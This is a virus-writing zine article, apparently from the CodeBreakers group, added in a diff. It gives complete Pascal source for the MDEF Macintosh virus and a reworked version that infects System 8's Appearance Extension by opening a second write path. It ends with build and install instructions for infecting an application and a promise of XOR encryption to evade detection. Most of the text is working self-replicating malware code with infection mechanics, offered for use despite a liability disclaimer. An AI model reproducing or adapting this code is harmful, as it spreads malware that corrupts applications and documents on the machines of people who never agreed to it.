@@ -1,0 +1,635 @@
+A FURTHER ANALYSIS OF THE MDEF (E) VIRUS PERTAINING TO ITS OPERATION
+UNDER SYSTEM 8.
+
+(c) J.S.Bach-XTAR [CodeBreakers]                               
+
+If you haven't downloaded the Codebreakers magazine #2 do it now. It is still
+available at the site www.codebreakers.org. If you already have downloaded
+it, you have followed the analysis I performed on the source of the MDEF
+virus. For completeness I will include it again, so you can have the full
+picture:
+
+unit MDEF;
+interface
+  procedure Main;
+implementation
+  procedure Main;
+    label
+      1000;
+    type
+      PtrPtr = ^Ptr;  {To retrieve the virus entry point address}
+      MDEFHeader = array[1..6] of integer;    {To access the MDEF header}
+      MDEFHeaderPtr = ^MDEFHeader;
+      MDEFHeaderHandle = ^MDEFHeaderPtr;
+    var
+      CurrentResFile, theAttrs, BranchOffset, Bytes2Copy: integer;
+      theMDEF, theApplMDEF, theSysMDEF: Handle;
+      comesFromApplication, SystemInfected, ApplicationInfected: boolean;
+      EntryAddress: Ptr;
+  begin
+    EntryAddress := PtrPtr($09CE)^;
+    currentResFile := CurResFile;
+    theMDEF := GetResource('MDEF', 0);
+    comesFromApplication := HomeResFile(theMDEF) = CurResFile;
+    if comesFromApplication then
+      begin  {check System}
+        UseResFile(0);
+        theSysMDEF := Get1Resource('MDEF', 0);
+        SystemInfected := (MDEFHeaderHandle(theSysMDEF)^^[5] = integer('BA'))
+        and (MDEFHeaderHandle(theSysMDEF)^^[6] = integer('CH'));
+        if not SystemInfected then    {infect System File}
+          begin
+{theSysMDEF now contains a handle to the System Heap code,}
+{and theMDEF contains a handle to the Application MDEF}
+{Now calculate the offset to the virus branch point...}
+            BranchOffset := SizeResource(theSysMDEF) - 2;
+{Next calculate the actual size of the virus. From the size}
+{of the MDEF, subtract the size of the nonviral part}
+            Bytes2Copy := SizeResource(theMDEF)
+            - ABS(Ord(StripAddress(theMDEF^))
+            - Ord(StripAddress(EntryAddress)));
+            HUnlock(theSysMDEF);
+{Next concatenate the virus to the System MDEF...}
+            if PtrAndHand(EntryAddress, theSysMDEF, Bytes2Copy) <>noErr then
+              goto 1000;
+{Now fix the Header...}
+            HLock(theSysMDEF);
+            MDEFHeaderHandle(theSysMDEF)^^[1] := $6100;      {BSR}
+            MDEFHeaderHandle(theSysMDEF)^^[2] := BranchOffset;{branch point}
+            MDEFHeaderHandle(theSysMDEF)^^[3] := $6006;      {BRA.S <Anon1>}
+            MDEFHeaderHandle(theSysMDEF)^^[4] := integer('JS');  {'JSBACH'}
+            MDEFHeaderHandle(theSysMDEF)^^[5] := integer('BA');
+            MDEFHeaderHandle(theSysMDEF)^^[6] := integer('CH');
+            HUnlock(theSysMDEF);
+{Finally set the resource attributes for the MDEF...}
+            theAttrs := GetResAttrs(theSysMDEF);
+            SetResAttrs(theSysMDEF, theAttrs
+            + ResSysHeap + ResLocked - ResPurgeable);
+{Now mark permanent, and rewrite System File...}
+            ChangedResource(theSysMDEF);
+            if ResError <> noErr then
+              {begin}
+              {DebugStr('Just after ResError');}
+              goto 1000;
+              {end;}
+            UpdateResFile(0);
+          end
+        else
+          goto 1000;{*}
+      {exit, System is infected}
+      end
+    else  {comes from System}
+{Note that if it both System and Application are infected, }
+{comesFromApplication will be TRUE, and we processed that already. So,}
+{we need to process only one case: (which is the case Application is not}
+{infected)}
+{but we check the other for completeness}
+      begin
+        UseResFile(CurrentResFile);
+        theApplMDEF := Get1Resource('MDEF', 0);
+        ApplicationInfected := theApplMDEF <> nil;
+        if not ApplicationInfected then
+          begin
+            UseResFile(0);
+            theSysMDEF := Get1Resource('MDEF', 0);
+            DetachResource(theSysMDEF);
+            UseResFile(CurrentResFile);
+            AddResource(theSysMDEF, 'MDEF', 0, '');
+            if ResError <> noErr then
+              goto 1000;
+            UpdateResFile(currentResFile);
+          end;
+      end;
+{Don't forget to restore the original application resource file}
+1000:
+    UseResFile(currentResFile);
+  end;
+end.
+
+I will not attempt a full re-analysis of the MDEF, instead, we will modify
+the virus slightly to target a better objective. System 8.0. If you
+experimented with the above virus, you have noticed that while it runs
+perfectly on System versions 7.x, it only runs "partially" on Apple's new
+Operating System, System 8.0. (As of this writting, OS 8.1 is already out as
+well). Let's see why it fails. The main body of the virus, contains a double
+clause, that with if comesFromApplication and its otherwise clause, which is
+the else {if it comes from System}. The if comes from system clause works
+perfectly. It works on System 8.0. That means that if the virus loads in
+memory in Sys 8.0 from an infected application, it will infect any other
+applications that are opened. However, the if comesFromSystem clause, fails
+miserably, thus the System files themselves, do NOT get infected, so the
+virus dies on the next restart, unless an infected application is run again.
+Let's look why: The call UseResFile(0); forces the System file to be the
+active resource file, so we can directly look at its resources. The call
+theSysMDEF:=Get1Resource('MDEF',0); attempts to load the memory resident
+already existing MDEF resource from the System file. The call
+SystemInfected:=... looks for our signature in that resource, to determine if
+the already loaded MDEF resource has been modified by us. Let's assume it's
+not infected, so the virus takes a branch into if not SystemInfected and
+calculates the Branch Offset, the Bytes to copy, it unlocks the MDEF memory
+handle so we can manipulate it, (look at the resource attributes with ResEdit
+on the MDEF 0 in the System file. It has the flag bit ResLocked set) Then the
+PtrAndHand call modifies the MDEF in memory, we lock it again so we can
+dereference the header bytes as you can see, then we play around with the
+resource attributes and set some attributes that are necessary for all system
+resources (ResSysHeap=Loads into System Heap at startup and not into
+application heap. The rest of the attributes are self-explanatory). Then we
+call the most important routine: ChangedResource(theSysMDEF); THIS trap is
+where the virus fails, because the resource file which contained the original
+MDEF that was loaded by the system, cannot be written to. If you really want
+to see that it fails like this, activate the statement DebugStr('Just after
+ResError'); and re-build the virus project. Then run the virus in a safe
+environment. When your application starts, it will immediately fall into
+MacsBug. Check the Stack for the error word, and you will find the word value
+$FFC3 on top of the stack. This is the error code returned by ResError. Since
+it is a function {function ResError:OSErr}, you will find the returned word
+value on the stack when you break into MacsBug. Ok, so what is this error?
+Hex $FFC3=-61 decimal, so we check the result codes in Inside Macintosh, and
+it is a screwy wrPermError. That is, a read/write permissions error. In our
+case, it is a write error. Ok, so now we need to find out why it happens. I
+am assuming you are running on System 8.0 of course. Exit MacsBug, and
+restart your computer. Now, I will save you some searching. The MDEF 0 can be
+found in two places. One, inside the actual System file itself. But the
+System file is writable, so it must be coming from somewhere else. And lo and
+behold, it does. System 8.0 has a new Extension, the "Appearance Extension"
+that's responsible for the new menu look of the Finder. Aha. So you open the
+Extension with ResEdit, only to find a nice juicy MDEF resource of id=0 in
+it, sitting sublime and quiet. So what is happening anyway then? It's
+actually quite simple. The Extension Appearance Extension is a "resource
+bypass" file. That is, the System resources get loaded, but we remember the
+following little fact: When a file opens and contains the resource "rsrc" of
+id=x, it gets loaded. Now if we open ANOTHER file that contains an IDENTICAL
+resource, again "rsrc" of id=x, the second resource bypasses the first and
+becomes active instead. Aha. So since Appearance Extension was loaded AFTER
+the System, the MDEF 0 resource FROM Appearance Extension has bypassed that
+of the system. So what's the problem? That can be tracked down as well. Now
+fall into MacsBug again manually using Control-Restart, and type "file" and
+press return. MacsBug will give you a list of all open files with various
+columns. Check the Fl column, and you will see the write permissions flags. W
+means writable, w means not. So, unfortunately, Apperance Extension, our
+bypass file is read only. Shucks.  Clever guys those at Apple. I wouldn't be
+surprised if they did it so that nobody can create MDEF viruses. But we are
+smarter than them aren't we? :)... So, to conclude, the above MDEF virus,
+tries to actually modify the MDEF that comes from a read-only file, and thus
+the change cannot be rendered permanent. Now, then, we have a clear objective
+at hand. How to figure a smart way to modify the damn MDEF 0 resource in
+Appearance Extension in some acceptable way. For this, let's try the
+following experiment: Open Appearance Extension with ResEdit. Select one of
+the STR resources and make some change to it. Then choose save. Close the
+file, then re-open it again, and revert the change, by changing back to what
+it was. It is successful (!). Now, we have the following funny facts: 1)MDEF
+0 comes from Apperance Extension which is read-only. 2)If we open ANOTHER
+data path for Apperance Extension, we CAN make changes, even though the file
+is open with read-only permission (!). (We just did with ResEdit) Conclusion:
+We have to open the file again, from INSIDE our virus, and create a new
+data-path, and modify the MDEF resource THROUGH the NEW data path. But how
+come we can open a new data path? Doesn't this mean we will corrupt the
+already existing resource map that has been loaded by the first instanciation
+of the open? Well, for those qurious enough, check
+http://devworld.apple.com/technotes/tn/tn1120.html, and read till you drop.
+It turns out that if we re-open the file, a new resource map is loaded in
+memory, which is independent of the old one, and is perfectly valid. So far,
+so good. Ok, so our next objective would be to create a routine that opens
+the aforementioned file again. How do we do that? For one, we have no name
+for it. Well, we have a name, Apperance Extension, but we don't want to
+depend on specific languages, because the Extension might be localized and
+its name may have been changed. It may be for all you know, Whacky Menus
+Extension. So we need to narrow our objective into finding data that we can
+feed our resource file opening routine, which is of course the call: RefNum
+:= FSPOpenResFile(theSpec, fsRdWrPerm); So we need to figure out a file
+specification for Apperance Extension and we are done. What do we know we
+"know" about Apperance Extension that cannot change in any system? 1) It will
+be located in the Extensions Folder for sure (because it IS an extension) and
+we know the File Type and File Creator! (Open with ResEdit and see them) File
+Type='INIT', File Creator 'appr'. Wonderful. So we can write a routine to
+search for these two parameters. Here is some sample code that will do that:
+program ListExtension;
+  uses
+    Folders;
+  var
+    theSpec: FSSpec;  {returned file specification}
+    theStr: Handle; {test STR handle to modify se we can check our routine}
+    RefNum: integer;  {the refnum of the Appearance Extension re-opened}
+  function GetAppearanceSpec (var theSpec: FSSpec): boolean;
+    label
+      1000, 1001;
+    var
+      foundVRefNum: integer;  {vrefnum returned from the FindFolder routine}
+      foundDirId: longint;  {dirId returned from FindFolder routine}
+      thePB: HParmBlkPtr; {memory parameter block needed for PBHGetFileInfo}
+      err: OSErr;
+      theName: Str255;    {the name returned indirectly}
+      foundit: boolean;    {flag if we find the file{
+  begin
+    foundit := False;
+    err := FindFolder(kOnSystemDisk, kExtensionFolderType,
+    kDontCreateFolder, foundVRefNum, foundDirId);
+    if err <> noErr then
+      goto 1000;
+    thePB := HParmBlkPtr(NewPtr(SizeOf(HParamBlockRec)));
+    if MemError <> noErr then
+      goto 1000;
+    with thePB^ do
+      begin
+        ioFDirIndex := 0;
+        repeat
+          ioCompletion := nil;
+          ioNamePtr := @theName;
+          ioVRefNum := foundVRefNum;
+          ioDirId := foundDirId;
+          ioFDirIndex := ioFDirIndex + 1;
+          err := PBHGetFInfo(thePB, false);
+          foundit := (ioFlFndrInfo.fdType = 'INIT')
+          and (ioFlFndrInfo.fdCreator = 'appr');
+        until (err = fnfErr) or foundit;
+        if err = fnfErr then
+          goto 1001;  {exit, we haven't found it}
+        err := FSMakeFSSpec(foundVRefNum, foundDirId, theName, theSpec);
+1001:
+        DisposePtr(Ptr(thePB));
+1000:
+      end; {with thePB^}
+    GetAppearanceSpec := foundit;
+  end;
+begin
+  if GetAppearanceSpec(theSpec) then
+    RefNum := FSPOpenResFile(theSpec, fsRdWrPerm);
+  writeln(ResError);
+  theStr := Get1Resource('STR ', -20233);
+  Writeln(ResError);
+  writeln(StringHandle(theStr)^^);
+  StringHandle(theStr)^^ := 'Appearance Prefs4';
+  ChangedResource(theStr);
+  Writeln(ResError);
+  UpdateResFile(refnum);
+  Writeln(ResError);
+  CloseResFile(RefNum);
+end.
+
+Ok, so let's see what this does. First we set the flag foundit to false, so
+that if the routine fails we can know without further ado if this is the
+case. The first statement, is the trap FindFolder. It is a routine that
+returns a vRefNum and a dirId of various subdirectories inside the System
+folder. Here, we need it to search inside the Extensions directory, that's
+why we specify kOnSystemDisk, and kExtensionFolderType as parameters. (To see
+all the available parameters, open the file Folders.p and look at the
+constants). Then we test if our routine was successful. If it was not, we
+simply exit. Next, we allocate memory for the parameter block needed for the
+GetFileInfo trap, testing for memory allocation errors as well. Next, we need
+to fill in some pertinent fields of the parameter block so that the trap
+PBHGetFInfo will find what we want. (For specifics of the Parameter block,
+check Inside Macintosh:Files) We push the address of our string, so that the
+name of the scan files will be returned, we feed the scan with the
+foundVRefNum that the routine FindFolder returned, and the same for dirId.
+The Routine PBHGetFInfo, will now cycle through the whole directory
+(Extensions Folder) starting from file with index 1, going to file with index
+2, 3, etc, until it goes through all the files. If the routine had gone
+through all the files, it will have returned fnfErr (file not found error).
+Next, we call the PBHGetFInfo, and since the routine returns info in its
+FInfo fields, we simply check those fields for the appropriate creator and
+file type. Aha!. But we are not done yet. The resource file opening trap
+(FSPOpenResFile) accepts a file specification. So we need to convert the data
+that we have (theName string, the foundDirId and the foundVRefNum), into a
+file specification. Actually, you can see that this whole scanning business
+was so that we could get hold of the actual name of the Apperance Extension
+file, which maybe totally different from what we expect. But because the
+creator and filetype are invariant, we are in good track. So we call the
+routine FSMakeFSSpec, which takes precisely the parameters we have and
+returns a file specification as a VAR. Now we are done. We dispose the memory
+we have used for the parameter block, and we exit. At this point the function
+GetApperanceSpec, will be True and we can use that not only to get our file
+specification and open the resource file, but to also actually test whether
+the Appearance Extension is installed. So we open the resource file again in
+the main program, and get hold of a dummy string to modify it and see if it
+works. It does. The rest of the calls are pretty much trivial resource
+manager calls, and we check for errors at every step to see if the preceding
+call to the corresponding trap was successful. Don't forget to revert the
+change that this program attempts (it just modifies the string "Apperance
+Preferences") back to what it was with ResEdit, because the Extension may
+have problems when you reboot. Our second objective is now complete. Note
+some interesting side effects: On System 7.x, there is STILL some resource
+bypass file (usually called Enabler) but the reason our virus works is
+because this file was read/write, so the virus actually could modify it with
+no problem. The significant difference between Sys 7.x and 8 is that they
+have shoved all the bypass resources that were previously in the Enabler
+file, into the new System file and/or into Apperance Extension, but now the
+later is read-only. Note now one pleasant side effect of the function we
+wrote. Ordinarily, we would have to use the gestalt function to check what
+version of the system we are running in, so we can branch to the correct code
+(whether to re-open AE (Apperance Extension) or not). With the function
+above, we don't have to do that. Why? Because if we EXPLICITLY check for the
+existence of the above file, we don't care if we are running in 7.x or 8. If
+the file AE exists, we re-open it and modify it. If it doesn't (in which case
+the function will return false) this means we can use the older code of the
+virus as it worked in sys 7.x (!) And the reason why this is important, is
+because Apple may decide again in the future to incorporate the AE resources
+BACK into the System file itself, so we don't need to bother with the file
+anyway. With some tweaking on our part, we can cover most of the 7.x and 8.0
+cases and maybe predict future cases where AE does not exist. Now we are
+ready for the final listing of our MDEF virus, which will work in System 8.0
+as well. Here comes: unit MDEF;
+interface
+ uses
+  Folders;
+ procedure Main;
+implementation
+ procedure Main;
+  label
+   1000;
+  type
+   PtrPtr = ^Ptr;           {To retrieve the virus entry point address}
+   MDEFHeader = array[1..6] of integer;    {To access the MDEF header}
+   MDEFHeaderPtr = ^MDEFHeader;
+   MDEFHeaderHandle = ^MDEFHeaderPtr;
+  var
+   CurrentResFile, theAttrs, BranchOffset, Bytes2Copy, sysFile: integer;
+   theMDEF, theApplMDEF, theSysMDEF: Handle;
+   comesFromApplication, SystemInfected, ApplicationInfected: boolean;
+   EntryAddress: Ptr;
+   theSpec: FSSpec;
+   theStr: Handle;
+   mustOpenAE: boolean;
+  function GetAppearanceSpec (var theSpec: FSSpec): boolean;
+   label
+    1000, 1001;
+   var
+    foundVRefNum: integer;
+    foundDirId: longint;
+    thePB: HParmBlkPtr;
+    err: OSErr;
+    theName: Str255;
+    foundit: boolean;
+  begin
+   foundit := False;
+   err := FindFolder(kOnSystemDisk, kExtensionFolderType,
+   kDontCreateFolder, foundVRefNum, foundDirId);
+   if err <> noErr then
+    goto 1000;
+   thePB := HParmBlkPtr(NewPtr(SizeOf(HParamBlockRec)));
+   if MemError <> noErr then
+    goto 1000;
+   with thePB^ do
+    begin
+     ioFDirIndex := 0;
+     repeat
+      ioCompletion := nil;
+      ioNamePtr := @theName;
+      ioVRefNum := foundVRefNum;
+      ioDirId := foundDirId;
+      ioFDirIndex := ioFDirIndex + 1;
+      err := PBHGetFInfo(thePB, false);
+      foundit := (ioFlFndrInfo.fdType = 'INIT')
+      and (ioFlFndrInfo.fdCreator = 'appr');
+     until (err = fnfErr) or foundit;
+     if err = fnfErr then
+      goto 1001;  {exit, we haven't found it}
+     err := FSMakeFSSpec(foundVRefNum, foundDirId, theName, theSpec);
+    end; {with thePB^}
+1001:
+   DisposePtr(Ptr(thePB));
+1000:
+   GetAppearanceSpec := foundit;
+  end;
+ begin
+  EntryAddress := PtrPtr($09CE)^;
+  currentResFile := CurResFile;
+  theMDEF := GetResource('MDEF', 0);
+  comesFromApplication := HomeResFile(theMDEF) = currentResFile;
+  mustOpenAE := False;
+  if comesFromApplication then
+   begin  {check System}
+    mustOpenAE := GetAppearanceSpec(theSpec);
+    if mustOpenAE then
+     begin
+      SysFile := FSPOpenResFile(theSpec, fsRdWrPerm);
+      if (SysFile = -1) or (ResError <> NoErr) then
+       begin
+       SysBeep(2);
+       goto 1000;
+       end;
+      UseResFile(SysFile);
+      theSysMDEF := Get1Resource('MDEF', 0);
+     end
+    else
+     begin
+      UseResFile(0);
+      theSysMDEF := Get1Resource('MDEF', 0);
+      SysFile := HomeResFile(theSysMDEF);
+     end;
+  {track system file where sysMDEF comes from}
+    HLock(theSysMDEF);
+    SystemInfected := (MDEFHeaderHandle(theSysMDEF)^^[5] = integer('BA'))
+    and (MDEFHeaderHandle(theSysMDEF)^^[6] = integer('CH'));  {*}
+    HUnlock(theSysMDEF);
+    if not SystemInfected then    {infect System File}
+     begin
+{theSysMDEF now contains a handle to the System Heap code,
+and theMDEF contains a handle to the Application MDEF}
+{Now calculate the offset to the virus branch point...}
+      BranchOffset := SizeResource(theSysMDEF) - 2;
+{Next calculate the actual size of the virus.
+From the size of the MDEF, subtract the size of the nonviral part}
+      Bytes2Copy := SizeResource(theMDEF)
+      - ABS(Ord(StripAddress(theMDEF^))
+      - Ord(StripAddress(EntryAddress)));
+{Get old resource Attributes}
+      theAttrs := GetResAttrs(theSysMDEF);
+{Change resource attributes to manipulate}
+      if BAND(theAttrs, ResLocked) = ResLocked then
+       SetResAttrs(theSysMDEF, theAttrs - ResLocked);
+{Next concatenate the virus to the System MDEF...}
+      if PtrAndHand(EntryAddress, theSysMDEF, Bytes2Copy) <> noErr then
+       goto 1000;
+{Now fix the Header...}
+      HLock(theSysMDEF);
+      MDEFHeaderHandle(theSysMDEF)^^[1] := $6100;      {BSR}
+      MDEFHeaderHandle(theSysMDEF)^^[2] := BranchOffset;{branch point}
+      MDEFHeaderHandle(theSysMDEF)^^[3] := $6006;      {BRA.S <Anon1>}
+      MDEFHeaderHandle(theSysMDEF)^^[4] := integer('JS');  {'JSBACH'}
+      MDEFHeaderHandle(theSysMDEF)^^[5] := integer('BA');
+      MDEFHeaderHandle(theSysMDEF)^^[6] := integer('CH');
+      HUnlock(theSysMDEF);
+{Finally set the resource attributes for the MDEF...}
+      SetResAttrs(theSysMDEF, theAttrs);
+{Now mark permanent, and rewrite System File...}
+      ChangedResource(theSysMDEF);
+{DebugStr('Just before ResError after Changed Resource!');}
+      if ResError <> noErr then
+       goto 1000;
+      if not mustOpenAE then
+       UpdateResFile(SysFile);
+     end  {if System not Infected}
+    else    {if system is infected}
+     goto 1000;        {exit, System is infected}
+   end {comes from Application}
+  else  {comes from System}
+{Note that if it both System and Application are infected, }
+{comesFromApplication will be TRUE, and we processed that already. So,}
+{we need to process only one case: (which is the case Application
+is not infected)}
+{but we check the other for completeness}
+   begin
+    UseResFile(CurrentResFile);
+    theApplMDEF := Get1Resource('MDEF', 0);
+    ApplicationInfected := theApplMDEF <> nil;
+    if not ApplicationInfected then
+     begin
+      UseResFile(0);
+      theSysMDEF := Get1Resource('MDEF', 0);
+      DetachResource(theSysMDEF);
+      UseResFile(CurrentResFile);
+      AddResource(theSysMDEF, 'MDEF', 0, '');
+      if ResError <> noErr then
+       goto 1000;
+      UpdateResFile(currentResFile);
+     end;
+   end;
+{Don't forget to restore the original application resource file}
+1000:
+  if mustOpenAE then
+   CloseResFile(SysFile);    {Close AE if we opened it}
+  UseResFile(currentResFile);
+ end;{main}
+end.{unit}
+
+Ok, there you have it. Now let's look at what we have done and try to
+understand it. We have added a couple of variables, and we have modified the
+conditionals a bit, to take care of our new infection of the AE file. The
+first statement calculates our reference point, which has been stored in low
+memory global $09CE by the header code (look at the file InstallMDEF.p in
+codebreakers #2, or in the 4 virus project (T4, 32767, MDEF, WDEF) available
+from www.codebreakers.org. Next we determine the current resource file. Next
+we load the resource MDEF,0, to see where it comes from. Note here, that if
+we are running SimpleText and it is infected, the MDEF 0 it contains will be
+bypassing the System MDEF 0, so we are basically loading ourselves. (i.e. the
+very code that's executed). Next the crucial check comes, which is to
+determine precisely that, namely if what we loaded was us, or was System. The
+variable comesFromApplication will tell us that. If it is false, it means the
+resource is coming from elsewhere, and not from the code that's running now,
+i.e. the infected application. So we branch, according to this condition. The
+most interesting case of course, is the case comesFromApplication, which
+means we have to check the System. Then we check if the file AE exists and is
+active. If it exists, mustOpenAE will be set to true, and we will modify the
+file accordingly. If mustOpenAE becomes true (which will be determined on the
+existence of AE from our function GetAppearanceSpec), then we DO re-open
+AE-as we said using a second data path. Else, if we find no AE file running,
+we are on System 7.x (since AE does not exist in our search from
+GetAppearanceSpec function, so we just assign as the system file whatever
+file the resource comes from (HomeResFile(theMDEF)). Then we make whatever
+file that is, active, so we can exclusively ask THIS file for changes to the
+MDEF we are going to modify. The "SysFile := FSPOpenResFile(theSpec,
+fsRdWrPerm);" opens a second data path to the AE file, this time read-write,
+and after opening it, we just quickly check for open errors, with "if
+(SysFile = -1) or (ResError <> NoErr) then". This block can actually be
+omitted, as most of the time it will be successful. (I haven't found it to be
+failing anytime I ran the virus.) Next, we request "UseResFile(SysFile);"
+which makes the AE file we just opened the most recent resource file. Next we
+ask for another copy of the MDEF, as "theSysMDEF" this time requesting it as
+coming from the open AE file specifically with "Get1Resource". (Remember,
+Get1Resource returns resources from the active resource file ONLY).
+
+Now we are on familiar ground. We look for our sig, by locking the handle we
+got and dereferencing it, so we can see if it contains the signature "BACH".
+If it does contain our sig, we branch to label 1000 which just closes the AE
+file, since it is already infected. If it does not contain our sig however,
+we calculate our Branch offset so that when the MDEF gets executed it will
+branch to our virus code first. Then we calculate how many bytes we should
+copy when we duplicate the virus. The number of bytes is calculated easily
+enough, and it is: Bytes of entire MDEF resource loaded in the beginning (the
+executable code that contains the virus), minus the difference (start address
+of MDEF minus entry point) this can be seen easily as follows: Since the
+virus is basically an appending virus, we have the following scheme:
+
+ ________     <---- Ord(StripAddress(theMDEF^))
+|  MDEF  |
+|  code  |
+|        |
+|        |
+|        |
+|        |
+ ________     <---- Ord(StripAddress(EntryAddress))
+| virus  |
+|        |
+ --------
+ 
+you can easily see that the entire segment (SizeResource(theMDEF)) minus the
+aforementioned difference, gives the length of the virus. Next we play a bit
+with the attributes. We want to disable certain attributes, such as
+ResLocked, which in particular prohibit any memory operations on our MDEF, so
+we can manipulate the MDEF memory handle. Next, we concatenate the virus
+bytes with the MDEF that we get from the AE resource file. The trap that does
+this is the PtrAndHand call, which takes 3 params: A pointer to the data that
+will be appended (@EntryAddress), the handle that the data will be appended
+to (theSysMDEF, which is, remember, an uninfected version of the MDEF that
+came from the AE file) and the number of bytes to copy (Bytes2Copy). Next we
+lock the sysMDEF, which by now has been altered, and fix the header of the
+MDEF so that it will branch correctly to our virus when it gets executed
+later. We add a BSR 680x0 (Branch to subroutine instruction) and we add the
+branch offset which is of course SizeResource(uninfected sysMDEF)-2 (-2
+because we are not counting the current instruction). Finally we add the
+virial signature and we unlock. We set the resource attributes to what they
+were before we manipulated the MDEF and call the "ChangedResource" trap,
+which sets the ResChanged bit, which is the bit that signifies that the
+resource file needs to be updated upon close. Normally, we could call
+immediatelly "UpdateResFile(SysFile)" and write the resource file out, but i
+found that the system crashes badly for no reason when doing that. Perhaps it
+does not like an immediate update. So i added one more conditional which will
+update the file ONLY if the AE file is not present. You should remember here
+that a mere "CloseResFile" call to the resource manager will be enough to
+update the resource file. "UpdateResFile" is for immediate updates. This
+covers the System not infected case. Let's look at the case where we are
+trying to run an app, on an infected system now. The exact sequence of events
+then, according to our actions will be: If an infected app is run, it will
+open and infect the AE file, but the virus will not become memory resident
+unless we have a restart. Why is that? you ask. Because, since the AE file is
+read-only, we can only re-open and modify it. We don't have access to its
+memory resident resources. Well, to be exact, we CAN do that, i.e. modify in
+them in memory, but this approach is more elegant, and it will save us from
+additional code. For example, we could have BOTH modified the resources in
+memory-which would activate the virus immediately AND modify the file AE
+through the second data path. We choose to ignore the memory modifications,
+as at some point in time the machine will be restarted anyway, so the
+resources will become memory resident anyway. So we have chosen the patient
+approach. So, now, if and when the mac gets restarted, the virus will start
+spreading, since it will branch to the second major segment, namely the else
+{comes from System} clause. The actions there are clear, and the virus will
+execute the statements as predicted. First we check whether the active
+resource file that's running is infected. If it is, the call
+"ApplicationInfected := theApplMDEF <> nil;" will return true and we skip the
+infection process. If not, the virus will activate the system resource file
+(UseResFile(0)) and we get a copy of the virus by requesting one with
+"theSysMDEF := Get1Resource('MDEF', 0);". We immediately call
+"DetachResource(theSysMDEF);" to disassociate the handle from its resource
+file. This forces the handle to float in memory and we can add it to anything
+we please. Then we call "UseResFile(CurrentResFile);" activating again the
+current resource file. (Application or any other opened files at the time).
+We finally call "AddResource(theSysMDEF, 'MDEF', 0, '');" which adds the
+viral resource to whatever file is active. That's it. To built the MDEF sys
+8.0 virus, copy the text above from "unit..." to "end." and paste it in the
+main source file for the MDEF project that you downloaded from the
+www.codebreakers.org site (the MDEF project that was contained in the four
+viruses (T4, 32767, MDEF, WDEF). Then select "Build Code Resource..." from
+the Project menu. Then close the project and open the project
+"InstallMDEF.proj". Before running this project, duplicate the application
+SimpleText, or any other application and place it into the same directory as
+the MDEF folder. After correcting the path names on top of the
+"InstallMDEF.proj" source file, select "Run" from the project menu, and the
+file will install the viral MDEF resource on that file. BE VERY CAREFUL WITH
+THIS VIRUS! IT IS VERY VIRULENT AND IT WILL INFECT MANY FILES ON YOUR
+MACHINE, AND NOT ONLY APPLICATION FILES, BUT DOCUMENTS AS WELL. IN PARTICULAR
+YOU ARE LIABLE TO CRIMINAL PENALTIES IF YOU TRY TO RELEASE THIS VIRUS. YOU
+HAVE BEEN WARNED. THE AUTHOR IS NOT RESPONSIBLE IF YOU RELEASE THIS VIRUS. In
+particular, while I was experimenting with it, it escaped and got into my
+screensaver and every time I booted from my second partition, it activated
+without my knowledge. By the way, the best way to experiment with little
+beasts like this one, is to segment your drive into two parts, and boot ONLY
+from the second partition if you want to see its effects. This way, if it
+gets out of hand, you can always boot from a clean partition and use ResEdit
+to remove the viral part from infected files. Be very careful. On the next
+article, I will try to experiment a bit with encryption and to see if we can
+succesfully encrypt this virus using a simple Xor routine, so that it will
+hide from prying eyes using a simple variable key. Until then, enjoy this sys
+8.0 virus. I believe it must be the first one which runs successfully without
+major dysfunctions on system 8.0.
+Have fun.
+J.S.Bach-XTAR                                                                                                                                                         
